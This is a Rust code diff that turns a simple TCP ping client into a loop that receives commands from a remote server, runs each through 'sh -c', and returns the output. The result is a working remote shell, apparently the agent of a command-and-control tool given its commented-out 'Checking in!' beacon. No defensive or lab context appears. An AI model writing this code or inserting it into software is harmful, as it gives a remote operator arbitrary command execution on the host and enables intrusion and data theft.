@@ -28,12 +28,23 @@ async fn main() -> Result<()> {
     let mut client: Box<dyn ProtoClient<Conf = TcpConf>> =
         Box::new(TcpClient::new_client(address, None).await?);
 
-    let msg_s = "Ping!";
-    let _ = client.send(msg_s.to_string()).await?;
-    println!("Message sent: {}", msg_s);
+    // let msg_s = "Checking in!";
+    // client.send(msg_s.to_string()).await?;
+    // println!("Message sent: {}", msg_s);
 
-    let msg_r = client.recv().await?;
-    println!("Message received: {}", msg_r);
+    loop {
+        let cmd = client.recv().await?;
+        let cmd = cmd.trim_end_matches('\0');
 
-    Ok(())
+        let output = Command::new("sh").arg("-c").arg(cmd).output()?;
+        let mut output = String::from_utf8_lossy(&output.stdout).to_string();
+
+        if output.is_empty() {
+            output.push('\n');
+        }
+
+        client.send(output).await?;
+    }
+
+    // Ok(())
 }
